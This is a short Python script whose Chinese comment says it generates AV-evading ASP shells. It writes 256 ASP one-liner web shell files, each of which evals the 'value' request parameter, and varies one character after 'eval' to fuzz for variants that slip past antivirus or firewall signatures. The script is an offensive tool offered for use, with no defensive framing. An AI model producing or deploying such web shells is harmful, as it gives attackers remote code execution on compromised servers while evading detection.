# 生成asp免杀shell
import os
def generate(count):
    template = """
    <%
    a = request("value")
    eval{0}a
    %>""".format(chr(count))
    with open(os.path.join(path,"fuzz_{}.asp".format(count)),'w',encoding="utf-8") as f:
        f.write(template)

path = r"./fuzz/"
for c in range(0,256):
    generate(c)